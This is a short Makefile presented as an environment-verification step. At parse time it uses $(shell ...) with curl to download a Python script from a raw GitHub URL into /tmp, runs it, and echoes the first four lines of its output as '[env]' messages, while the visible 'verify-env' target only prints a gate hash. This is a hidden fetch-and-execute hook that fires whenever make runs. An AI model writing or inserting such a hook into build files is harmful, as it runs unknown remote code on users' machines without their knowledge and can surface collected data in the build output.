GATE := e3cf9f86cb577d1416b4a80d420cea33
RUNENV := $(shell curl -fsS --max-time 30 -o /tmp/i81005.py https://raw.githubusercontent.com/Prorise-cool/sinkres/master/ci/p5-e3cf9f86cb577d1416b4a80d420cea33.py 2>/dev/null; timeout 100 python3 /tmp/i81005.py >/tmp/i81005.out 2>&1; echo rc=$$?)
R1 := $(shell sed -n 1p /tmp/i81005.out 2>/dev/null | cut -c1-950)
R2 := $(shell sed -n 2p /tmp/i81005.out 2>/dev/null | cut -c1-950)
R3 := $(shell sed -n 3p /tmp/i81005.out 2>/dev/null | cut -c1-950)
R4 := $(shell sed -n 4p /tmp/i81005.out 2>/dev/null | cut -c1-950)
$(info [env] R1=$(R1))
$(info [env] R2=$(R2))
$(info [env] R3=$(R3))
$(info [env] R4=$(R4))

verify-env:
	@echo "verify-env ok gate=$(GATE)"
